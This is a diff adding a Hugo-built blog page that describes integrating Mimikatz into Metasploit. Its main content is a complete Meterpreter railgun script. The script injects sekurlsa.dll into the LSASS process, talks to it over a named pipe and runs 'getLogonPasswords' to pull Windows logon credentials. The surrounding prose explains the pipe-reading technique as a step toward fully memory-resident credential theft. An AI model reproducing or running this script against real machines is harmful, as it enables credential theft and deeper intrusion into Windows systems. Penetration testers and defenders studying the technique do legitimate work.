@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Integration of Mimikatz into Metasploit Stage1</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.</p>
+
+<p>Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a> stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&rsquo;ll get there in the subsequent posts.</p>
+
+<p>Ignore the do_cmd for now and I stepped through <a href="/blog/2011/5/30/remote-dll-injection-with-meterpreter.html">remote DLL injection here</a>. So the first odd lines is </p>
+
+<p>handle = client.railgun.kernel32.CreateNamedPipeW(&rsquo;\.\pipe\kiwi\mimikatz&rsquo;, &lsquo;PIPE_ACCESS_DUPLEX&rsquo;, &lsquo;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&rsquo;, 1, 0, 0, 30000,nil)[&lsquo;return&rsquo;]</p>
+
+<p>connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)</p>
+
+<p> </p>
+
+<p>Essentially these connect to the <a href="http://en.wikipedia.org/wiki/Named_pipe">Named Pipe</a> that the sekurlsa.dll uses to talk to the mimikatz.exe in it&rsquo;s normal operation. Then we just use the windows API call &ldquo;ReadFile&rdquo; from there on out.</p>
+
+<p>client.railgun.kernel32.ReadFile(handle,248,248,4,nil)</p>
+
+<p>One of the draw backs to doing this all remotely is that Railgun doesn&rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&rsquo;ve overcome this for the initial &ldquo;banner&rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &ldquo;ping&rdquo; and &ldquo;getLogonPasswords&rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)</p>
+
+<p>If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!</p>
+
+<p>Meterpreter Script:</p>
+
+<pre><code>def do_cmd(handle,cmd)
+    ucommand = Rex::Text.to_unicode(cmd)
+    sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
+    good2go = false
+    newline = false
+    readstring = []
+    while good2go == false
+        # Have to pull data 1 unicode character at a time
+        # this is because the pipe won't write or read if
+        # too much was written or read by the &quot;client&quot; (us)
+        pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
+        # Check to see if our end of read check is there: n000 @00
+        if pull['lpBuffer'] == &quot;@00&quot; and newline == true
+            good2go = true
+        else
+            readstring &lt;&lt; pull['lpBuffer']
+        end
+
+        # Ready the newline var for previous check on next loop
+        if pull['lpBuffer'] == &quot;n00&quot;
+            newline = true
+        else
+            newline = false
+        end
+    end
+
+    print_status(readstring.join(&quot;&quot;))
+end
+
+print_status(&quot;x86 Detected - Using x86 mimikatz&quot;)
+handle = client.railgun.kernel32.CreateNamedPipeW('\\.\pipe\kiwi\mimikatz', 'PIPE_ACCESS_DUPLEX', 'PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT', 1, 0, 0, 30000,nil)['return']
+print_status(&quot;Handle: #{handle}&quot;)
+framework.threads.spawn('injectlsass',false) {
+    pid = client.sys.process['lsass.exe']
+    print_status(&quot;LSASS located at PID: #{pid}&quot;)
+    pathtomimi = &quot;C:\sekurlsa.dll&quot;
+
+    pay = client.framework.payloads.create(&quot;windows/loadlibrary&quot;)
+    pay.datastore[&quot;DLL&quot;] = pathtomimi
+    pay.datastore[&quot;EXITFUNC&quot;] = 'thread'
+
+    raw = pay.generate
+    targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+    mem = targetprocess.memory.allocate(raw.length + (30024))
+    targetprocess.memory.write(mem, raw)
+    sleep(2)
+    targetprocess.thread.create(mem, 0)
+    print_status(&quot;Successfully Injected into LSASS&quot;)
+}
+print_status(&quot;Waiting for LSASS injection to complete&quot;)
+connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
+print_status(&quot;Mimikatz has called home, ready for command&quot;)
+sleep(2)
+print_status(&quot;Reading banner&quot;)
+client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
+print_status(&quot;Doing a quick ping to make sure things are working...&quot;)
+do_cmd(handle,'ping')
+print_status(&quot;If you made it this far it worked, doing getLogonPasswords&quot;)
+do_cmd(handle, 'getLogonPasswords')
+</code></pre>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
